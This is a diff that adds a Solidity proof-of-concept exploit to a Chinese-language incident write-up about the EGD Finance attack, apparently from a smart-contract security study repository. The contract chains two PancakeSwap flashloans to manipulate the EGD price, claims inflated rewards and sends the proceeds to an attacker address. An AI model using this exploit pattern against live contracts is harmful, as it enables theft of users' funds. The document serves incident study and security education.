@@ -141,6 +141,79 @@
 
 最后，将收益转给攻击者。
 
+## PoC
+```solidity
+contract Exploit {
+    address recipient = 0xee0221D76504Aec40f63ad7e36855EEbF5eA5EDd;
+
+    function stake() public {
+        console.log("Attacker staking 100 USDT...");
+        // Set invitor
+        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
+        // Stake 100 USDT
+        IERC20(usdt).approve(EGD_Finance, 100 ether);
+        IEGD_Finance(EGD_Finance).stake(100 ether);
+    }
+
+    function harvest() external {
+        // uint256 amountUSDTBefore = IERC20(usdt).balanceOf(address(this));
+        // 攻击逻辑
+        IEGD_Finance(EGD_Finance).calculateAll(address(this));
+        // 攻击合约首先查询 LP 合约存放的EGD、BSC-USD数量和代理合约的EGD数量
+        uint256 amountEGDCakeLP = IERC20(egd).balanceOf(address(EGD_USDT_LPPool));
+        uint256 amountUSDTCakeLP = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool));
+
+        // 向 USDT_WBNB_LPPool 借出2000 BSC-USD
+        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
+        USDT_WBNB_LPPool.swap(2000 * 1e18, 0, address(this), "0000");
+        console.log("Flashloan[1] payback success");
+
+        // 套利
+        uint256 amountUSDTAfter = IERC20(usdt).balanceOf(address(this));
+        IERC20(usdt).transfer(recipient, amountUSDTAfter);
+    }
+
+    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
+        if( keccak256(data) == keccak256("0000") ){
+            console.log("Flashloan[1] received");
+            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
+            uint256 borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
+            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
+            
+            uint256 amountEGD = IERC20(egd).balanceOf(address(this));
+            address[] memory path = new address[](2);
+            (path[0], path[1]) = (egd,usdt);
+
+            // 将自己手中的EDG全部用来交换BSC-USD
+            console.log("Swap the profit...");
+            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
+            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountEGD, 1, path, address(this), block.timestamp);
+            
+            // 还款1
+            bool success = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 ether);
+            require(success, "Flashloan[1] payback failed");
+
+        } else if( keccak256(data) == keccak256("00")){
+            console.log("Flashloan[2] received");
+            emit log_named_decimal_uint(
+                "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
+            );
+
+            // 漏洞
+            console.log("Claim all EGD Token reward from EGD Finance contract");
+            IEGD_Finance(EGD_Finance).claimAllReward();
+             emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
+            
+            // 还款2
+            uint256 fee = (amount1 * 10000 / 9970) - amount1;
+            bool success = IERC20(usdt).transfer(address(EGD_USDT_LPPool), fee + amount1);
+            require(success, "Flashloan[2] payback failed");
+        }
+    }
+}
+
+```
+
 完整的 PoC 在这里：https://github.com/Chocolatieee0929/ContractSafetyStudy/blob/main/Security/PoC/EDGFinance.t.sol
 
 # 安全建议
